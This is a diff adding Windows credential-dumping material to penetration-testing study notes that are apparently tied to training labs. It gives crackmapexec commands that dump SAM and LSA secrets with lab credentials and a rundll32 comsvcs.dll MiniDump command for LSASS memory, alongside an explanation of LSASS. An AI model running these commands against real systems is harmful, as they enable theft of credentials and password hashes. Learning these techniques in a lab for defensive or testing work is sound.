@@ -156,3 +156,45 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -s
 ```
 
 Check cracking to see how to crack hashes, PTH tho?
+
+Extract Hashes from SAM Database with admin creds
+
+### Do the above remotly
+
+```
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+```
+### LSA remote dump
+```
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+## Attack LSASS
+
+The Windows Local Security Authority Subsystem Service (LSASS) is a critical component of the Windows operating system that handles various security-related functions, including user authentication, local security policy enforcement, and management of security tokens.
+
+Here's an explanation of Windows LSASS and its functionalities:
+
+1)  Process Description: LSASS is a system process that runs in the background of the Windows operating system. It operates as a protected system process, meaning it runs with elevated privileges and cannot be terminated by normal means.
+
+2)  Authentication and Authorization: One of the primary functions of LSASS is user authentication. When a user attempts to log in to a Windows system, LSASS handles the authentication process. It verifies the user's credentials (username and password) against the password hashes stored in the SAM database (Security Account Manager), which we discussed earlier. If the authentication is successful, LSASS creates a security token for the user, which contains the user's security identifier (SID) and their associated security privileges.
+
+3)  Security Token Management: LSASS is responsible for managing security tokens. These tokens are created for users during logon and contain the user's identity, group memberships, and security privileges. The tokens are then used to grant or deny access to various system resources based on the user's permissions.
+
+4)  Enforcement of Security Policies: LSASS enforces local security policies on the system. These policies define various security settings, such as password complexity requirements, account lockout policies, and user rights assignments. LSASS ensures that these policies are applied and followed when users log in and access system resources.
+
+5)  Lsass.exe Process: The LSASS service is represented by the lsass.exe process in Task Manager. As a critical system process, it is essential to protect it from unauthorized access and tampering. Malware or attackers may attempt to target LSASS for privilege escalation or credential theft, making it a high-value target for security.
+
+6)  Handling LSA Secrets: In addition to user authentication and security token management, LSASS also deals with Local Security Authority (LSA) secrets. LSA secrets are sensitive data, such as service account passwords, auto-logon credentials, and other encrypted information used by the system. LSASS securely stores and manages these secrets, ensuring they are accessible only by authorized processes and services.
+
+
+### Dump with task manager
+
+Right click on 'Local Security Authority Process'
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b17ce34e-871f-4d46-8e4a-00ee00dd4e72)
+
+### Dump with Powershell
+```
+PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 672 C:\lsass.dmp full
+```
+### pypykatz to extract creds
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/73175859-68c8-4c57-b017-179492da0fdb)
